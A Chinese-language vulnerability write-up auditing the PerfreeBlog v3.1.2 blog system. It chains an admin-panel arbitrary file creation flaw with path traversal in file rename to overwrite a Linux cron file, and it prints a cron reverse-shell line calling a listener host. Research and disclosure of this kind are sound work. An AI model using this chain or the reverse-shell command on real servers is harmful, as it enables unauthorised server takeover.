### 环境搭建

本文审计的是PerfreeBlog最新的v3.1.2版本，一个开源的个人博客系统，直接从github的release中拉取相应的源代码，这里开始用的windows环境，后续为了方便进一步挖掘利用链改成了linux。windows下配置一下本地maven，然后配置一下mysql等就可以了

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-fec742e8fb6758bc15e89b4f37c67b8860f117e4.png)

### 失败SQL

由于涉及数据库操作用的是开源的mybatis，索性一开始就把目标放在了sql注入上，但是sql注入并没有利用成功  
熟悉mybatis的师傅应该都知道造成sql注入的成因，这里直接全局去搜索$,找到了如下：`com/perfree/mapper/ArticleMapper.java`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-08caae19372b73459ba43aae6a66346ad831d30d.png)  
根据id调用的接口进行回溯(推荐idea的一个插件MyBatisX，便于对接口和sql语句的快速定位)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-a6ab7d40dbcf94645e9e4ce36ddf9052476c4fbc.png)  
查看apiList被调用的情况

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-9766496a62af46ab2936939aaef4b46a5e63d41e.png)  
`com/perfree/controller/api/ArticleController.java`，一些获取参数的就不看了，跟进generateOrderBy

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-5b2eafb8c29ea4fad74774159fa4b28c97991440.png)

这里是对获取到的参数进行处理，根据前面所知，orderBy参数可控且是可能存在的注入点，对获取到的数据以','进行分割，并对数组进行了白名单匹配，若数组中的数据不在白名单中就直接返回为空

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-63222240157ab575d470dc92f1c3da9be54818cc.png)

白名单的数据来源如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-402028c49699f826531afa7d9e861f569253391d.png)

所以这里最后的sql执行语句反而变的不可控了，只能是白名单中的数据才可以；其他可能存在的利用点最后经过审计也都不可利用

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-da81c964b2c4ee6ff47292ab23b2c6e476ee84ef.png)

### 文件上传

在sql不可利用之后，将注意点转向了后台可能存在的文件上传的点  
`com/perfree/controller/admin/ThemeController.java`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-89c29370555e9fe29bf2df046ec35b1027895dc1.png)

跟进createFileOrDir,将传递的参数进行了处理，对filePath是否为空白字符进行判断

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-ee213192a1038fc08f3f20cb898ee4ee2d3a88e4.png)

调用FileUtil工具类的touch方法在绝对路径下创建了文件,未对后缀做任何限制，可创建任意后缀的文件,并且注意到未对..和/进行过滤，可以进行目录穿越创建文件

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-0491a67f57c3c3622ea7b29f761b511155f87404.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-014dc88e6d731306e6d86a501d28899786593dfe.png)  
接下来找到写入文件内容的方法

通过调试跟进函数，传递的content参数并没有被过滤，也就是说写入文件的内容可控

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-5eb2746805a8dbf7af9468b960add07e1a8aefa1.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-ab340831c9b3d0a1f4a4c5b87929de11401db01c.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-08608192361e3246d4a6d2400df919d40256321c.png)

这里本来想直接上传一个jsp文件的，但是发现并没有用中间件，纯是SprintBoot写的，在pom.xml中没有进行配置是无法解析jsp文件的，还需要想想其他的方法  
结合前面的目录穿越，尝试了写入文件时能不能，但是注意到这里对文件路径进行了校验，通过获取themeDir的路径进行判断是否存在，不存在会直接返回文件不存在

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-91e91b8857a5a944b4d9a3b21ede709394f0da83.png)

在同一个类中看了看其他的函数，其中一个貌似可以利用

文件重命名函数

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-e44cf21bca11759935b34ac496e0badd77f9421c.png)

断点调试一下,基本和创建文件的流程差不多，并且没有对重命名传入的文件名进行过滤，也就是说是在重命名文件的时候可以进行目录穿越

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-7c8de5303a9938bceb2e6f599e5eb029f97cef5c.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-15304b4a3dda38e27df74621034b6e1ac11ce072.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-e5bc4a2d7168adabe086ad8a86fe94359a7f1baf.png)

通过上面的分析，捋一捋现在能利用的路径

后台权限-&gt;主题新建文件-&gt;写入恶意代码-&gt;文件重命名路径穿越

现在还差最后一步，找到最终的可利用点

#### 计划任务

linux下可以尝试通过覆盖计划任务文件反弹shell

##### docker

在用官方docker的时候发现是拉取的debian镜像，索性改了一个centos的，Dockerfile如下

```php
FROM centos:centos7.6.1810
COPY ./jdk-8u181-linux-x64.tar.gz /jdk-8u181-linux-x64.tar.gz
COPY ./perfree-web-3.1.2.tar.gz /perfree-web-3.1.2.tar.gz
RUN yum install crontabs -y
RUN tar -zxvf /jdk-8u181-linux-x64.tar.gz &amp;&amp; mv jdk1.8.0_181 /usr/local/
RUN tar -zxvf /perfree-web-3.1.2.tar.gz &amp;&amp; mv perfree-web /usr/local/
WORKDIR /usr/local/perfree-web
EXPOSE 8080
CMD [ "/usr/local/jdk1.8.0_181/bin/java","-jar","/usr/local/perfree-web/perfree-web.jar" ]
```

接上面的利用链重命名文件，进入docker查看，已经成功写入计划任务，但是在查看计划任务执行的日志文件时发现并不存在该日志文件

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-0b8308e742ab24aa509d253bf493fe528ba4b89b.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-3b93f1093711a535a6d9f0d934504bf79448c0dd.png)  
![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-3bc576f7d1bd9712188b89f85e9297e771150937.png)

查找资料之后也并没有解决这个问题，并且容器中相关的cron配置文件缺失不少，有一个说是启动一个centos的特权容器计划任务能够执行，那就换个容器。

这里说一下后台的功能点，如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-3b02a16aec0021172304c64be2500b9e7eaca7b3.png)

一样的操作，修改文件名

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-493508c503e3f3194eff88183fa38ae067bec0a4.png)

文件内容依旧是计划任务反弹shell，这里写入的时候注意换行符，也是试了很多次之后发现没有换行符计划任务执行是有问题的

```php
*/1 * * * * bash -i &gt;&amp; /dev/tcp/ip/1234 0>&1

```

在跑着cms的服务器上查看计划任务列表和日志，可以看到计划任务的执行情况，另一台监听的服务器成功接收到弹回的shell

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/09/attach-3079293d531b57c0caa5f4b1eea935d7ee7adda2.png)

![](https://cdn.nlark.com/yuque/0/2023/png/2741102/1679994070901-2f5a0fc8-1096-421b-98f8-4ed9c999ef9c.png)

到这里就能够成功通过组合拳拿到服务器的权限了

### final

距离审计已经过了好几个月，第一时间已经将上述漏洞信息告知了项目作者，但暂未看到修复信息，后台的利用限制确实显得比较鸡肋。